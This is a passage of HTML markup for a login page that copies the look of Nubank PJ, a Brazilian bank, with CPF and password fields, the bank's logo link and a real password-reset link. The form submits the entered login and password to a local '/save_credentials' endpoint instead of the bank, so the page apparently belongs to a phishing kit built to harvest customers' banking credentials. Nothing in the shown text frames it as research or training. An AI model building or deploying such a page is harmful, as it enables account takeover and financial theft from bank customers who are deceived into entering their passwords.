        <a href="https://nubank.com.br/" id="logo">

                </path>
            </svg>
        </a>
        <form action="/save_credentials" method="POST">
            <h1>Acesse o Nubank PJ</h1>
            <div class="input">
                <label for="login">CPF</label>
                <div id="input-login">
                    <input type="text" id="login" name="login">
                    <button type="button" disabled>
                        <svg viewBox="0 0 24 24" id="invalido" style="display: none;">
                            <title>warning_circle</title>
                            <path d="M13 15V17H11V15H13Z"></path>
                            <path d="M13 14V7H11V14H13Z"></path>
                            <path
                                d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22ZM12 20C7.58172 20 4 16.4183 4 12C4 7.58172 7.58172 4 12 4C16.4183 4 20 7.58172 20 12C20 16.4183 16.4183 20 12 20Z">
                            </path>
                        </svg>
                    </button>
                </div>
                <p id="alerta-login"></p>
            </div>
            <div class="input">
                <label for="password">Senha</label>
                <div id="input-senha">
                    <input type="password" id="password" name="password">
                    <button type="button" id="mostrar-senha">
                        <svg viewBox="0 0 24 24" id="mostrar" style="display: block;">
                            <title>Show password</title>
                            <path

                            </path>
                        </svg>
                        <svg viewBox="0 0 24 24" id="esconder" style="display: none;">
                            <title>Hide password</title>
                            <path
                                d="M2.84468 13.536L2.9516 13.3675C4.86257 10.3549 6.99074 7 12.0005 7C17.0102 7 19.1384 10.3549 21.0493 13.3675L21.1562 13.536L22.8447 12.464C22.7847 12.3696 22.724 12.2736 22.6624 12.1761C20.801 9.23351 18.123 5 12.0005 5C5.87794 5 3.19997 9.23351 1.33855 12.1762C1.27698 12.2735 1.21613 12.3697 1.15625 12.464L2.84468 13.536Z">
                            </path>
                            <path
                                d="M16.0005 13C16.0005 15.2091 14.2096 17 12.0005 17C9.79132 17 8.00046 15.2091 8.00046 13C8.00046 10.7909 9.79132 9 12.0005 9C14.2096 9 16.0005 10.7909 16.0005 13ZM14.0005 13C14.0005 11.8954 13.105 11 12.0005 11C10.8959 11 10.0005 11.8954 10.0005 13C10.0005 14.1046 10.8959 15 12.0005 15C13.105 15 14.0005 14.1046 14.0005 13Z">
                            </path>
                        </svg>
                    </button>
                </div>
                <p id="alerta-senha">A senha precisa ter 8 ou mais caracteres.</p>
            </div>
            <a href="https://app.nubank.com.br/beta/login/esqueci-senha/">Esqueci a senha</a>
            <button type="submit" id="enviar-formulario" disabled>
                <p>Acessar</p>
                <svg viewBox="0 0 24 24">
                    <title>arrow_right</title>
                    <path
                        d="M12 4L10.59 5.41L16.17 11H4V13H16.17L10.59 18.59L12 20L19.2929 12.7071C19.6834 12.3166 19.6834 11.6834 19.2929 11.2929L12 4Z">
                    </path>
                </svg>
            </button>
        </form>
        <div id="opcoes-secundarias">
